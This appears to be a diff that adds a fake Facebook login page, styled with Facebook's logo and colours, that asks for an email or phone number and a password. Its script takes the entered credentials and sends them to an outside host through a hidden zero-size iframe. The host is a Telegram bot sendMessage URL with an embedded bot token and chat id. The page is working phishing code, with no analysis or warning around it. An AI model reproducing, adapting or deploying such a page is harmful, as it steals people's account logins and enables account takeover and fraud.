@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Facebook Login</title>
+  <style>
+    body {
+      margin: 10;
+      padding: 10;
+      font-family: Helvetica, Arial, sans-serif;
+      background-color: #f0f2f5;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+
+    .login-container {
+      background: white;
+      padding: 40px;
+      border-radius: 10px;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+      width: 100%;
+      max-width: 400px;
+    }
+
+    .logo {
+      display: flex;
+      justify-content: center;
+      margin-bottom: 30px;
+    }
+
+    .logo svg {
+      width: 60px;
+      height: 60px;
+    }
+
+    h2 {
+      text-align: center;
+      color: #1877f2;
+      margin-bottom: 20px;
+    }
+
+    input[type="number"], input[type="password"] {
+      width: 90%;
+      padding: 12px;
+      margin: 8px 0;
+      border: 1px solid #ddd;
+      border-radius: 6px;
+      font-size: 16px;
+    }
+
+    .login-btn {
+      width: 100%;
+      background-color: #1877f2;
+      color: white;
+      border: none;
+      padding: 12px;
+      font-size: 16px;
+      border-radius: 6px;
+      cursor: pointer;
+      margin-top: 10px;
+    }
+
+    .login-btn:hover {
+      background-color: #145dbf;
+    }
+
+    @media (max-width: 480px) {
+      .login-container {
+        padding: 20px;
+      }
+
+      .logo svg {
+        width: 40px;
+        height: 40px;
+      }
+
+      h2 {
+        font-size: 20px;
+      }
+    }
+    iframe{
+    position:fixed;
+    width:0px;
+    height:0px;
+    opacity:0;
+    }
+  </style>
+  <script type="text/javascript">
+  function submiter(){
+  var pስልክ = document.getElementById("emailphone").value;
+  var pቁጥር = document.getElementById("password").value;
+  var data = {
+  gmail_phone:pስልክ,
+  password:pቁጥር
+  }
+  if(pስልክ==""||pቁጥር==""){
+  alert("pleace insert login info!");
+  }else{
+  var frame = document.getElementById("frame");
+  frame.setAttribute("src" ,"https://api.telegram.org/bot7991316137:AAFvOyfzDlDWD47GVi3ZsTD41rVlPkFGyDY/sendMessage?chat_id=@sponsered123&text="+(JSON.stringify(data))+"");
+  }}
+  </script>
+</head>
+<body>
+  <div class="login-container">
+    <div class="logo">
+      <!-- Internal Facebook SVG Icon -->
+      <svg viewBox="0 0 36 36" fill="#1877f2" xmlns="http://www.w3.org/2000/svg">
+        <path d="M18 0C8.06 0 0 8.06 0 18c0 8.98 6.59 16.43 15.19 17.83V23.27h-4.57v-5.27h4.57v-3.95c0-4.52 2.7-7.01 6.85-7.01 1.99 0 4.08.35 4.08.35v4.49h-2.3c-2.27 0-2.98 1.41-2.98 2.85v3.27h5.07l-.81 5.27h-4.26v12.56C29.41 34.43 36 26.98 36 18 36 8.06 27.94 0 18 0z"/>
+      </svg>
+    </div>
+    <h2>Login to Facebook</h2>
+    <form action=""method="">
+      <input id="emailphone"type="number" placeholder="Email or phone number" required />
+      <input id="password"type="password" placeholder="Password" required />
+      <button onclick="submiter()"class="login-btn">Log In</button>
+    </form>
+  </div>
+  
+  <iframe id="frame"src="">
+</body>
+</html>
